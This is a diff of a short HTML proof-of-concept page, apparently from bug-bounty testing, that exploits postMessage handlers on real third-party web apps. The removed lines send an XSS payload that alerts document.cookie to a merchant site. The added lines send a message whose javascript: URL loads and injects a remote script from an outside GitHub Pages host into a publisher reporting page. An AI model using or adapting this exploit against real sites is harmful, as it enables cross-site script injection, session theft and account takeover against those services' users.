@@ -1,10 +1,23 @@
 <html>
-  
-    
  <script>
-     bbtestgo = window.open("https://merchant.mykeeta.com/m/web/app/bizdata","_blank");
-  setTimeout(function(){
-           bbtestgo.window.postMessage({type:'message',data:'{"pushLevel":2,"title":"XSS on the DOM","content":"<img src onerror=alert(document.cookie)>","url":"javascript:alert(document.domain)"}',uniqueKey:'pike_push_message'},'*');
-},5000)
+     function getQueryParam(name) {
+	        var urlParams = new URLSearchParams(window.location.search);
+	        return urlParams.get(name);
+	  }
+
+	  var API_DOMAIN = getQueryParam('host');
+    // Chrome 更稳：%0a + 空格改 %20，且不用 ||
+    const rangersDomain =
+      'javascript://%0avoid((function(){var%20w=window.opener%7C%7Cwindow;var%20s=w.document.createElement('script');s.src='https://johnstonemees.github.io/poc/tiktok/poc.js';(w.document.body%7C%7Cw.document.documentElement).appendChild(s)})())//fedev-web-visual/';
+    
+
+    bbtestgo = window.open("https://www.pangleglobal.com/publisher/report","_blank");
+    setTimeout(function(){
+             bbtestgo.postMessage({
+                type: 'tea:openVisualEditor',
+                referrer: { apiDomain: API_DOMAIN, rangersDomain },
+                lang: 'zh',
+              }, '*');
+  },5000)
    </script>
 </html>
